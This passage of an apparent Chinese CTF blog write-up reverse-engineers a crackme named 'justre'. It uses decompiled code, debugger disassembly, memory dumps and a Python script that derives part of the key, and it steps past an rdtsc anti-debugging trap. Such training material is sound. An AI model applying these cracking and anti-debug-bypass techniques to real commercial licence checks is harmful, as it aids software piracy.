<span class="number">0x19</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v3 - <span class="number">55</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">  v9 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v3), <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v10 = *(_BYTE *)(v2 + <span class="number">8</span>);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= <span class="number">48</span> &amp;&amp; v10 &lt;= <span class="number">57</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v10 - <span class="number">65</span>;</span><br><span class="line">    v30 = v10 - <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = v10 - <span class="number">65</span>;</span><br><span class="line">  v30 = v10 - <span class="number">65</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v10 - <span class="number">65</span>) &gt; <span class="number">0x19</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">  v13 = *(_BYTE *)(v2 + <span class="number">9</span>);</span><br><span class="line">  v29 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v13 &lt; <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v13 &lt;= <span class="number">57</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = v13 - <span class="number">65</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = v13 - <span class="number">65</span>;</span><br><span class="line">  v30 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt; <span class="number">0x19</span>u )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">LABEL_24:</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v10 - <span class="number">48</span>) &gt; <span class="number">9u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v30 &gt; <span class="number">0x19</span>u )</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v15 = <span class="number">16</span> * (v10 - <span class="number">7</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15 = <span class="number">16</span> * v10;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = *(_BYTE *)(v2 + <span class="number">9</span>) - <span class="number">48</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;= <span class="number">9u</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt; <span class="number">0x19</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_33:</span><br><span class="line">    v11 = v15 + v16;</span><br><span class="line">    v17 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  v11 = v15 + *(_BYTE *)(v2 + <span class="number">9</span>) - <span class="number">55</span>;</span><br><span class="line">LABEL_35:</span><br><span class="line">  v18 = _mm_cvtsi32_si128((<span class="keyword">char</span>)v11);</span><br><span class="line">  v19 = _mm_unpacklo_epi8(v18, v18);</span><br><span class="line">  v27 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v19, v19), <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4053C4 &gt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="number">16</span>;</span><br><span class="line">      v21 = _mm_mullo_epi32(_mm_cvtepu8_epi32(_mm_cvtsi32_si128(v27.m128i_u32[<span class="number">0</span>])), (__m128i)xmmword_404380);</span><br><span class="line">      xmmword_405018 = (__int128)_mm_xor_si128(</span><br><span class="line">                                   _mm_add_epi32((__m128i)xmmword_404340, v9),                                   _mm_add_epi32(v21, (__m128i)xmmword_405018));</span><br><span class="line">      xmmword_405028 = (__int128)_mm_xor_si128(</span><br><span class="line">                                   _mm_add_epi32(_mm_add_epi32((__m128i)xmmword_404350, (__m128i)xmmword_404340), v9),                                   _mm_add_epi32(v21, (__m128i)xmmword_405028));</span><br><span class="line">      xmmword_405038 = (__int128)_mm_xor_si128(</span><br><span class="line">                                   _mm_add_epi32(_mm_add_epi32((__m128i)xmmword_404360, (__m128i)xmmword_404340), v9),                                   _mm_add_epi32(v21, (__m128i)xmmword_405038));</span><br><span class="line">      xmmword_405048 = (__int128)_mm_xor_si128(</span><br><span class="line">                                   _mm_add_epi32(_mm_add_epi32((__m128i)xmmword_404370, (__m128i)xmmword_404340), v9),                                   _mm_add_epi32(v21, (__m128i)xmmword_405048));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;xmmword_405018 + v20) = (v20 + v3) ^ (<span class="number">16843009</span> * v11 + *((_DWORD *)&amp;xmmword_405018 + v20));</span><br><span class="line">      ++v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v20 &lt; <span class="number">24</span> );</span><br><span class="line">    v22 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *((_BYTE *)&amp;xmmword_405018 + v22) == *((_BYTE *)&amp;loc_404148 + v22) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v22 &gt;= <span class="number">96</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v28 = <span class="number">0</span>;</span><br><span class="line">        v23 = __rdtsc();</span><br><span class="line">        <span class="keyword">if</span> ( HIDWORD(v23) &gt; HIDWORD(v26) || (v28 = v23 - v26, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v23 - v26) &gt;= <span class="number">0xFFFFFF</span>) )</span><br><span class="line">          MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        v24 = GetCurrentProcess();</span><br><span class="line">        WriteProcessMemory(v24, sub_4018A0, &amp;xmmword_405018, <span class="number">0x60</span>u, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不是特别懂, 但也能从中读到一点东西。</p><p> <code>if ( ++v4 &gt;= 8 )</code>可知输入字符串至少为8位</p><p>之后就直接动态调试了, 这里用的是x32dbg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401636  | 8A343E                      | mov dh, byte ptr ds:[esi+edi]                 |</span><br><span class="line">00401639  | 80FE 30                     | cmp dh, 30                                    | 30:&#x27;0&#x27;</span><br><span class="line">0040163C  | 7C 0C                       | jl justre.40164A                             |</span><br><span class="line">0040163E  | 80FE 39                     | cmp dh, 39                                    | 39:&#x27;9&#x27;</span><br><span class="line">00401641  | 7F 07                       | jg justre.40164A                             |</span><br><span class="line">00401643  | 8AD6                        | mov dl, dh                                    |</span><br><span class="line">00401645  | 80EA 41                     | sub dl, 41                                    |</span><br><span class="line">00401648  | EB 0A                       | jmp justre.401654                            |</span><br><span class="line">0040164A  | 8AD6                        | mov dl, dh                                    |</span><br><span class="line">0040164C  | 80EA 41                     | sub dl, 41                                    |</span><br><span class="line">0040164F  | 80FA 19                     | cmp dl, 19                                    |</span><br><span class="line">00401652  | 77 2C                       | ja justre.401680                             |</span><br><span class="line">00401654  | 8ACE                        | mov cl, dh                                    |</span><br><span class="line">00401656  | C1E0 04                     | shl eax, 4                                    |</span><br><span class="line">00401659  | 80E9 30                     | sub cl, 30                                    |</span><br><span class="line">0040165C  | 80F9 09                     | cmp cl, 9                                     | 9:&#x27;\t&#x27;</span><br><span class="line">0040165F  | 77 05                       | ja justre.401666                             |</span><br><span class="line">00401661  | 83C0 D0                     | add eax, FFFFFFD0                             |</span><br><span class="line">00401664  | EB 08                       | jmp justre.40166E                            |</span><br><span class="line">00401666  | 80FA 19                     | cmp dl, 19                                    |</span><br><span class="line">00401669  | 77 08                       | ja justre.401673                             |</span><br><span class="line">0040166B  | 83C0 C9                     | add eax, FFFFFFC9                             |</span><br><span class="line">0040166E  | 0FBECE                      | movsx ecx, dh                                 |</span><br><span class="line">00401671  | 03C1                        | add eax, ecx                                  |</span><br><span class="line">00401673  | 46                          | inc esi                                      |</span><br><span class="line">00401674  | 83FE 08                     | cmp esi, 8                                    |</span><br><span class="line">00401677  | 7C BD                       | jl justre.401636                             |</span><br></pre></td></tr></table></figure><p>这里是判断函数的第一个循环, 用黑盒直接猜测, 这里是读取前8位字符到eax</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/1558934804066.png" alt="1558934804066"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401682  | 66:0F6EC0                   | movd xmm0, eax                                |</span><br><span class="line">00401686  | 66:0F70E8 00                | pshufd xmm5, xmm0, 0                           |</span><br></pre></td></tr></table></figure><p>这两句, 将前八为扩展到xmm5中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmm5                12345678123456781234567812345678</span><br></pre></td></tr></table></figure><p>这一句, 读取了后两位, 所以从这里可以知道输入字符至少10位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401693  | 8A57 08                     | mov dl, byte ptr ds:[edi+8]                   | edi+8:&quot;AB&quot;</span><br></pre></td></tr></table></figure><p>继续黑盒, 可知, 在这几句之前的语句都是在执行将后两位读取到ecx中, 而这几句则是将其扩展到xmm0中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401728  | 0FBECE                      | movsx ecx, dh                                 |</span><br><span class="line">0040172B  | 66:0F6EC1                   | movd xmm0, ecx                                |</span><br><span class="line">0040172F  | 66:0F60C0                   | punpcklbw xmm0, xmm0                          |</span><br><span class="line">00401733  | 66:0F61C0                   | punpcklwd xmm0, xmm0                          |</span><br><span class="line">00401737  | 66:0F70C0 00                | pshufd xmm0, xmm0, 0                           |</span><br><span class="line">0040173C  | 0F2945 E0                   | movaps xmmword ptr ss:[ebp-20], xmm0          |</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/1558935387042.png" alt="1558935387042"></p><p>接下来由单步调试就可知, 将下面, 每次读取16个16进制字符进行运算(最后两组是分别进行, 每次读取4个16进制字符):</p><p>先分别加上后两位, 这里就是加上AB, 再每八位, 和前八位加上i的数异或后再送回[00405018]</p><p>例如:3E5F11D5FE0F0B1DEA90BD987BB39408加上ABABABABABABABABABABABABABABABAB, 在和12345678123456781234567812345678加上00000003000000020000000100000000后的1234567B1234567A1234567912345678异或后得F83EEBFBBB8EE0B284083F3A356B69CB, 然后送回[00405018]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00405010                            08 94 B3 7B 98 BD 90 EA  /.........³&#123;.½.ê  </span><br><span class="line">00405020  1D 0B 0F FE D5 11 5F 3E 37 FC CA 85 B4 F1 3A FC  ...þÕ._&gt;7üÊ.´ñ:ü  </span><br><span class="line">00405030  39 0D 16 EE 35 75 50 3E 3B 6D CF 3D FC 0C 5D 07  9..î5uP&gt;;mÏ=ü.].  </span><br><span class="line">00405040  2E 51 EB 29 EF BB 16 58 3C 85 50 3E 40 2F 16 B0  .Që)ï».X&lt;.P&gt;@/.°  </span><br><span class="line">00405050  FD F0 4E 07 32 4E 19 64 03 95 4B 22 00 9A 8B 22  ýðN.2N.d..K&quot;...&quot;  </span><br><span class="line">00405060  91 0E 0F FE 1C 0D 5F 07 38 51 EB F9 A0 65 16 FE  ...þ.._.8Qëù e.þ  </span><br><span class="line">00405070  49 33 4F 89 C6 F1 56 FC                              I3O.ÆñVü</span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">00405010                             CB 69 6B 35 3A 3F 08 84  /.......Ëik5:?..  </span><br><span class="line">00405020  B2 E0 8E BB FB EB 3E F8 37 FC CA 85 B4 F1 3A FC  ²à.»ûë&gt;ø7üÊ.´ñ:ü  </span><br><span class="line">00405030  39 0D 16 EE 35 75 50 3E 3B 6D CF 3D FC 0C 5D 07  9..î5uP&gt;;mÏ=ü.].  </span><br><span class="line">00405040  2E 51 EB 29 EF BB 16 58 3C 85 50 3E 40 2F 16 B0  .Që)ï».X&lt;.P&gt;@/.°  </span><br><span class="line">00405050  FD F0 4E 07 32 4E 19 64 03 95 4B 22 00 9A 8B 22  ýðN.2N.d..K&quot;...&quot;  </span><br><span class="line">00405060  91 0E 0F FE 1C 0D 5F 07 38 51 EB F9 A0 65 16 FE  ...þ.._.8Qëù e.þ  </span><br><span class="line">00405070  49 33 4F 89 C6 F1 56 FC                          I3O.ÆñVü</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401831  | 8A81 18504000               | mov al, byte ptr ds:[ecx+405018]              |</span><br><span class="line">00401837  | 3A81 48414000               | cmp al, byte ptr ds:[ecx+404148]              |</span><br><span class="line">0040183D  | 75 4F                       | jne justre.40188E                            |</span><br><span class="line">0040183F  | 41                          | inc ecx                                      |</span><br><span class="line">00401840  | 83F9 60                     | cmp ecx, 60                                   |</span><br><span class="line">00401843  | 7C EC                       | jl justre.401831                             |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这几句则是将运算后的字符和[404148]处的字符进行对比, 即是主函数中的（一开始IDA给识别成了语句, 直接undifine即可）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; _BYTE byte_404148[96]</span><br><span class="line">.rdata:00404148 byte_404148     db 55h, 8Bh, 0ECh, 83h, 0E4h, 0F0h, 81h, 0ECh, 78h, 2</span><br><span class="line">.rdata:00404148                                         ; DATA XREF: sub_401610+227↑r</span><br><span class="line">.rdata:00404148                 db 2 dup(0), 0A1h, 4, 50h, 40h, 0, 33h, 0C4h, 89h, 84h</span><br><span class="line">.rdata:00404148                 db 24h, 74h, 2, 2 dup(0), 0Fh, 10h, 5, 0A8h, 41h, 40h</span><br><span class="line">.rdata:00404148                 db 0, 0A0h, 0C0h, 41h, 40h, 0, 56h, 0Fh, 11h, 44h, 24h</span><br><span class="line">.rdata:00404148                 db 2Ch, 57h, 0F3h, 0Fh, 7Eh, 5, 0B8h, 41h, 40h, 0, 66h</span><br><span class="line">.rdata:00404148                 db 0Fh, 0D6h, 44h, 24h, 40h, 0Fh, 10h, 41h, 0Ah, 6Ah, 40h</span><br><span class="line">.rdata:00404148                 db 88h, 44h, 24h, 4Ch, 8Dh, 84h, 24h, 0FCh, 1, 2 dup(0)</span><br><span class="line">.rdata:00404148                 db 6Ah, 0, 50h, 0Fh, 11h, 44h, 24h, 1Ch, 0E8h, 58h, 0Fh</span><br><span class="line">.rdata:00404148                 db 2 dup(0), 6Ah, 40h, 8Dh, 84h, 24h, 48h, 2</span><br><span class="line">.rdata:004041A8                 xmmword 4E434158435843594445434641534641h</span><br><span class="line">.rdata:004041B8                 dq 43585143444B4644h</span><br><span class="line">.rdata:004041C0                 db 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道了运算过程, 那就可以来解出前10位:我这里通过先求出前八位, 再求出后两位的方法</p><p>因为前八位, 对相邻的4个16进制数操作相差为1, 则可通过最初的两位求出满足条件的8位数, 再相减求出满足相差为1的且参与运算的后两位是相同的前八位, 再通过已知前八位来算出后两位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>]</span><br><span class="line"></span><br><span class="line">aa = []</span><br><span class="line"></span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0xFF</span>):</span><br><span class="line">    s1 = [<span class="number">0x08</span>, <span class="number">0x94</span>, <span class="number">0xB3</span>, <span class="number">0x7B</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">4</span>):</span><br><span class="line">        s1[j] += i</span><br><span class="line">    key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0XFFFFFFF</span> &lt; (key ^ key2) &lt;= <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        aa.append(key ^ key2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aa.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>]</span><br><span class="line"></span><br><span class="line">bb = []</span><br><span class="line"></span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0xFF</span>):</span><br><span class="line">    s1 = [<span class="number">0x98</span>, <span class="number">0xBD</span>, <span class="number">0x90</span>, <span class="number">0xEA</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">4</span>):</span><br><span class="line">        s1[j] += i</span><br><span class="line">    key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0XFFFFFFF</span> &lt; (key ^ key2) &lt;= <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        bb.append(key ^ key2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bb.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(aa)):</span><br><span class="line">    <span class="keyword">if</span> aa[i] != <span class="number">0</span> <span class="keyword">and</span> bb[i] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> bb[i] - aa[i] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="built_in">hex</span>(aa[i])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s = [<span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>]</span><br><span class="line">s1 = [<span class="number">0x98</span>, <span class="number">0xBD</span>, <span class="number">0x90</span>, <span class="number">0xEA</span>]</span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line">key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>((key ^ bb[i]) - key2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x13242248L</span><br><span class="line">0x15151515L</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即前10位为<code>1324224815</code>, 但输进去还是sorry, 那就是后面还有一些东西</p><p>继续调试:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401862  | 8900                        | mov dword ptr ds:[eax], eax                   |</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( HIDWORD(v23) &gt; HIDWORD(v26) || (v28 = v23 - v26, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v23 - v26) &gt;= <span class="number">0xFFFFFF</span>) )</span><br><span class="line">         MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试到这里程序会崩溃, 根据IDA这里MEMORY[0] = 0也是分析不出来的, 直接设下一句为新EIP即可</p><p>接着开始瞎猜模式…….</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401949  | 8B8424 F8010000             | mov eax, dword ptr ss:[esp+1F8]               |</span><br><span class="line">00401950  | 8D9424 70010000             | lea edx, dword ptr ss:[esp+170]               |</span><br><span class="line">00401957  | 83C4 18                     | add esp, 18                                   |</span><br><span class="line">0040195A  | 898424 D8010000             | mov dword ptr ss:[esp+1D8], eax               |</span><br><span class="line">00401961  | 8B8424 E4010000             | mov eax, dword ptr ss:[esp+1E4]               |</span><br><span class="line">00401968  | 8D8C24 D8010000             | lea ecx, dword ptr ss:[esp+1D8]               |</span><br><span class="line">0040196F  | 898424 DC010000             | mov dword ptr ss:[esp+1DC], eax               |</span><br><span class="line">00401976  | E8 85F6FFFF                 | call &lt;justre.sub_401000&gt;                     |</span><br><span class="line">0040197B  | 8B8424 E8010000             | mov eax, dword ptr ss:[esp+1E8]               |</span><br><span class="line">00401982  | 8D9424 D8000000             | lea edx, dword ptr ss:[esp+D8]                |</span><br><span class="line">00401989  | 898424 D8010000             | mov dword ptr ss:[esp+1D8], eax               |</span><br><span class="line">00401990  | 8D8C24 D8010000             | lea ecx, dword ptr ss:[esp+1D8]               |</span><br><span class="line">00401997  | 8B8424 EC010000             | mov eax, dword ptr ss:[esp+1EC]               |</span><br><span class="line">0040199E  | 898424 DC010000             | mov dword ptr ss:[esp+1DC], eax               |</span><br><span class="line">004019A5  | E8 56F6FFFF                 | call &lt;justre.sub_401000&gt;                     |</span><br><span class="line">004019AA  | 8B8424 F0010000             | mov eax, dword ptr ss:[esp+1F0]               |</span><br><span class="line">004019B1  | 8D5424 58                   | lea edx, dword ptr ss:[esp+58]                |</span><br><span class="line">004019B5  | 898424 D8010000             | mov dword ptr ss:[esp+1D8], eax               |</span><br><span class="line">004019BC  | 8D8C24 D8010000             | lea ecx, dword ptr ss:[esp+1D8]               |</span><br><span class="line">004019C3  | 8B8424 F4010000             | mov eax, dword ptr ss:[esp+1F4]               |</span><br><span class="line">004019CA  | 898424 DC010000             | mov dword ptr ss:[esp+1DC], eax               |</span><br><span class="line">004019D1  | E8 2AF6FFFF                 | call &lt;justre.sub_401000&gt;                     |</span><br><span class="line">004019D6  | 8D7424 10                   | lea esi, dword ptr ss:[esp+10]                |</span><br><span class="line">004019DA  | 8D4E 01                     | lea ecx, dword ptr ds:[esi+1]                 |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这几个语句, 将读进来的<code>AFSAFCEDYCXCXACNDFKDCQXC</code>分成三部分, 并每部分都往前填充成一个新的字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;AFSAFCEDAFSAFCEDYCXCXACNDFKDCQXC&quot;</span><br><span class="line">&quot;YCXCFACNAFSAFCEDYCXCXACNDFKDCQXC&quot;</span><br><span class="line">&quot;DFKDCQXCAFSAFCEDYCXCXACNDFKDCQXC&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间这里, 在前十位后由读进来了16个字符, 并转化成16个16进制数, 通过<code>call &lt;justre.sub_401500&gt;</code>加密, 并且是分成两块进行加密, 每次加密64位, 加密运算后存储</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401A50  | 0FB68434 F9010000           | movzx eax, byte ptr ss:[esp+esi+1F9]          |</span><br><span class="line">00401A58  | 0FB68C34 F8010000           | movzx ecx, byte ptr ss:[esp+esi+1F8]          |</span><br><span class="line">00401A60  | 0FB69434 FC010000           | movzx edx, byte ptr ss:[esp+esi+1FC]          |</span><br><span class="line">00401A68  | C1E0 08                     | shl eax, 8                                    |</span><br><span class="line">00401A6B  | 0BC8                        | or ecx, eax                                   |</span><br><span class="line">00401A6D  | 0FB68434 FA010000           | movzx eax, byte ptr ss:[esp+esi+1FA]          |</span><br><span class="line">00401A75  | C1E0 10                     | shl eax, 10                                   |</span><br><span class="line">00401A78  | 0BC8                        | or ecx, eax                                   |</span><br><span class="line">00401A7A  | 0FB68434 FB010000           | movzx eax, byte ptr ss:[esp+esi+1FB]          |</span><br><span class="line">00401A82  | C1E0 18                     | shl eax, 18                                   |</span><br><span class="line">00401A85  | 0BC8                        | or ecx, eax                                   |</span><br><span class="line">00401A87  | 0FB68434 FD010000           | movzx eax, byte ptr ss:[esp+esi+1FD]          |</span><br><span class="line">00401A8F  | 898C24 D8010000             | mov dword ptr ss:[esp+1D8], ecx               |</span><br><span class="line">00401A96  | 0FB68C34 FF010000           | movzx ecx, byte ptr ss:[esp+esi+1FF]          |</span><br><span class="line">00401A9E  | C1E0 08                     | shl eax, 8                                    |</span><br><span class="line">00401AA1  | 0BD0                        | or edx, eax                                   |</span><br><span class="line">00401AA3  | C1E1 08                     | shl ecx, 8                                    |</span><br><span class="line">00401AA6  | 0FB68434 FE010000           | movzx eax, byte ptr ss:[esp+esi+1FE]          |</span><br><span class="line">00401AAE  | 0BC8                        | or ecx, eax                                   |</span><br><span class="line">00401AB0  | 8D4424 58                   | lea eax, dword ptr ss:[esp+58]                |</span><br><span class="line">00401AB4  | C1E1 10                     | shl ecx, 10                                   |</span><br><span class="line">00401AB7  | 0BCA                        | or ecx, edx                                   |</span><br><span class="line">00401AB9  | 8D9424 58010000             | lea edx, dword ptr ss:[esp+158]               |</span><br><span class="line">00401AC0  | 50                          | push eax                                     |</span><br><span class="line">00401AC1  | 8D8424 DC000000             | lea eax, dword ptr ss:[esp+DC]                |</span><br><span class="line">00401AC8  | 898C24 E0010000             | mov dword ptr ss:[esp+1E0], ecx               |</span><br><span class="line">00401ACF  | 50                          | push eax                                     |</span><br><span class="line">00401AD0  | 8D8C24 E0010000             | lea ecx, dword ptr ss:[esp+1E0]               |</span><br><span class="line">00401AD7  | E8 24FAFFFF                 | call &lt;justre.sub_401500&gt;                     |                                             前面是取, 后面是存储, 函数用来加密运算</span><br><span class="line">00401ADC  | 8B8C24 E0010000             | mov ecx, dword ptr ss:[esp+1E0]               |</span><br><span class="line">00401AE3  | 83C4 08                     | add esp, 8                                    |</span><br><span class="line">00401AE6  | 888C34 38020000             | mov byte ptr ss:[esp+esi+238], cl             |</span><br><span class="line">00401AED  | 8BC1                        | mov eax, ecx                                  |</span><br><span class="line">00401AEF  | C1E8 08                     | shr eax, 8                                    |</span><br><span class="line">00401AF2  | 888434 39020000             | mov byte ptr ss:[esp+esi+239], al             |</span><br><span class="line">00401AF9  | 8BC1                        | mov eax, ecx                                  |</span><br><span class="line">00401AFB  | C1E8 10                     | shr eax, 10                                   |</span><br><span class="line">00401AFE  | 888434 3A020000             | mov byte ptr ss:[esp+esi+23A], al             |</span><br><span class="line">00401B05  | C1E9 18                     | shr ecx, 18                                   |</span><br><span class="line">00401B08  | 888C34 3B020000             | mov byte ptr ss:[esp+esi+23B], cl             |</span><br><span class="line">00401B0F  | 8B8C24 DC010000             | mov ecx, dword ptr ss:[esp+1DC]               |</span><br><span class="line">00401B16  | 8BC1                        | mov eax, ecx                                  |</span><br><span class="line">00401B18  | 888C34 3C020000             | mov byte ptr ss:[esp+esi+23C], cl             |</span><br><span class="line">00401B1F  | C1E8 08                     | shr eax, 8                                    |</span><br><span class="line">00401B22  | 888434 3D020000             | mov byte ptr ss:[esp+esi+23D], al             |</span><br><span class="line">00401B29  | 8BC1                        | mov eax, ecx                                  |</span><br><span class="line">00401B2B  | C1E8 10                     | shr eax, 10                                   |</span><br><span class="line">00401B2E  | C1E9 18                     | shr ecx, 18                                   |</span><br><span class="line">00401B31  | 888434 3E020000             | mov byte ptr ss:[esp+esi+23E], al             |</span><br><span class="line">00401B38  | 888C34 3F020000             | mov byte ptr ss:[esp+esi+23F], cl             |</span><br><span 